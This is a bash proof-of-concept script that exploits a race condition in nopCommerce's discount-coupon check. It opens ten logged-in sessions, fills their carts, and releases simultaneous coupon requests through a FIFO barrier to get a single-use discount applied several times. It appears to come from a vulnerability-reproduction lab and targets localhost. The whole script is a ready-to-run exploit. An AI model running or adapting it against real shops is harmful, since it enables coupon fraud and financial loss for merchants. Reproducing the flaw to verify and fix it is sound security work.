#!/bin/bash
#
# PoC: nopCommerce Discount Race Condition
#
# This script uses curl to send concurrent requests
# to exploit the TOCTOU race condition
#

BASE_URL="http://localhost:8080"
DISCOUNT_CODE="${1:-RACE_TEST}"
NUM_REQUESTS=10
COOKIE_FILE="/tmp/nop_session_"
RESULTS_DIR="/home/clouditera/漏洞研判复现/test/results"

mkdir -p "$RESULTS_DIR"

echo "========================================"
echo "nopCommerce Race Condition PoC"
echo "========================================"
echo "Target: $BASE_URL"
echo "Discount Code: $DISCOUNT_CODE"
echo "Concurrent Requests: $NUM_REQUESTS"
echo "========================================"

# Function to create an authenticated session
create_session() {
    local session_id=$1
    local cookie_file="${COOKIE_FILE}${session_id}.txt"

    # Get login page and extract token
    local login_page=$(curl -s -c "$cookie_file" -b "$cookie_file" "$BASE_URL/login")
    local token=$(echo "$login_page" | grep -oP 'name="__RequestVerificationToken"[^>]*value="\K[^"]+' | head -1)

    # Login as test user
    curl -s -c "$cookie_file" -b "$cookie_file" \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "Email=testuser@test.com&Password=Test123!&__RequestVerificationToken=$token" \
        -o /dev/null

    echo "$cookie_file"
}

# Function to add product to cart
add_to_cart() {
    local cookie_file=$1

    # Get a product page
    local product_page=$(curl -s -c "$cookie_file" -b "$cookie_file" "$BASE_URL")
    local product_url=$(echo "$product_page" | grep -oP 'href="/[^"]*product[^"]*"' | head -1 | cut -d'"' -f2)

    if [ -n "$product_url" ]; then
        curl -s -c "$cookie_file" -b "$cookie_file" "$BASE_URL$product_url" -o /dev/null

        # Get add to cart token
        local cart_page=$(curl -s -c "$cookie_file" -b "$cookie_file" "$BASE_URL$product_url")
        local token=$(echo "$cart_page" | grep -oP 'name="__RequestVerificationToken"[^>]*value="\K[^"]+' | head -1)
        local product_id=$(echo "$cart_page" | grep -oP 'data-productid="\K\d+' | head -1)

        if [ -n "$product_id" ]; then
            curl -s -c "$cookie_file" -b "$cookie_file" \
                -X POST "$BASE_URL/addproducttocart/details/$product_id/1" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "__RequestVerificationToken=$token&addtocart_${product_id}.EnteredQuantity=1" \
                -o /dev/null
        fi
    fi
}

# Function to apply discount
apply_discount() {
    local session_id=$1
    local cookie_file="${COOKIE_FILE}${session_id}.txt"
    local result_file="$RESULTS_DIR/result_${session_id}.txt"

    # Get cart page token
    local cart_page=$(curl -s -c "$cookie_file" -b "$cookie_file" "$BASE_URL/cart")
    local token=$(echo "$cart_page" | grep -oP 'name="__RequestVerificationToken"[^>]*value="\K[^"]+' | head -1)

    # Apply discount - capture full response
    local start_time=$(date +%s%N)
    local response=$(curl -s -c "$cookie_file" -b "$cookie_file" \
        -X POST "$BASE_URL/cart" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "__RequestVerificationToken=$token&discountcouponcode=$DISCOUNT_CODE&applydiscountcouponcode=Apply+coupon" \
        -w "\nHTTP_CODE:%{http_code}")
    local end_time=$(date +%s%N)

    local elapsed=$(( (end_time - start_time) / 1000000 ))
    local http_code=$(echo "$response" | grep -oP 'HTTP_CODE:\K\d+')
    local body=$(echo "$response" | sed '/HTTP_CODE:/d')

    # Check if discount was applied
    if echo "$body" | grep -qi "applied\|success"; then
        echo "SUCCESS|$session_id|$elapsed|$http_code" > "$result_file"
        echo "[Thread $session_id] SUCCESS - Discount applied (${elapsed}ms)"
    elif echo "$body" | grep -qi "cannot be used\|expired\|limit"; then
        echo "REJECTED|$session_id|$elapsed|$http_code" > "$result_file"
        echo "[Thread $session_id] REJECTED - Limit reached (${elapsed}ms)"
    else
        echo "UNKNOWN|$session_id|$elapsed|$http_code" > "$result_file"
        echo "[Thread $session_id] UNKNOWN - Check response (${elapsed}ms)"
    fi
}

echo ""
echo "[*] Creating authenticated sessions..."

# Create sessions in parallel
for i in $(seq 1 $NUM_REQUESTS); do
    create_session $i &
done
wait

echo "[*] Adding products to cart..."

for i in $(seq 1 $NUM_REQUESTS); do
    add_to_cart "${COOKIE_FILE}${i}.txt" &
done
wait

echo ""
echo "[*] Launching concurrent discount applications..."
echo "    (All requests start simultaneously using barrier)"
echo ""

# Use a fifo as a barrier
BARRIER_FILE="/tmp/race_barrier"
rm -f "$BARRIER_FILE"
mkfifo "$BARRIER_FILE"

# Start all discount applications waiting at barrier
for i in $(seq 1 $NUM_REQUESTS); do
    (
        # Wait for barrier signal
        read < "$BARRIER_FILE"
        apply_discount $i
    ) &
done

# Small delay to ensure all processes are waiting
sleep 0.5

# Release all processes simultaneously
for i in $(seq 1 $NUM_REQUESTS); do
    echo "GO" > "$BARRIER_FILE" &
done
wait

rm -f "$BARRIER_FILE"

echo ""
echo "========================================"
echo "RESULTS SUMMARY"
echo "========================================"

SUCCESS_COUNT=$(grep -l "SUCCESS" "$RESULTS_DIR"/result_*.txt 2>/dev/null | wc -l)
REJECTED_COUNT=$(grep -l "REJECTED" "$RESULTS_DIR"/result_*.txt 2>/dev/null | wc -l)
UNKNOWN_COUNT=$(grep -l "UNKNOWN" "$RESULTS_DIR"/result_*.txt 2>/dev/null | wc -l)

echo "Successful applications: $SUCCESS_COUNT"
echo "Rejected applications:   $REJECTED_COUNT"
echo "Unknown results:         $UNKNOWN_COUNT"
echo ""

if [ "$SUCCESS_COUNT" -gt 1 ]; then
    echo "========================================"
    echo "VULNERABILITY CONFIRMED!"
    echo "========================================"
    echo "Discount was applied $SUCCESS_COUNT times"
    echo "when the limit was set to 1."
    echo ""
    echo "This proves the TOCTOU race condition:"
    echo "1. Multiple threads passed validation"
    echo "2. Before usage history was recorded"
    echo "3. All threads successfully used discount"
    echo "========================================"
elif [ "$SUCCESS_COUNT" -eq 1 ]; then
    echo "========================================"
    echo "NORMAL BEHAVIOR"
    echo "========================================"
    echo "Only 1 discount application succeeded."
    echo "Race condition may exist but was not"
    echo "exploited in this run. Try again."
    echo "========================================"
else
    echo "========================================"
    echo "TEST INCONCLUSIVE"
    echo "========================================"
    echo "No successful applications."
    echo "Check if discount code is valid."
    echo "========================================"
fi

# Cleanup
rm -f ${COOKIE_FILE}*.txt
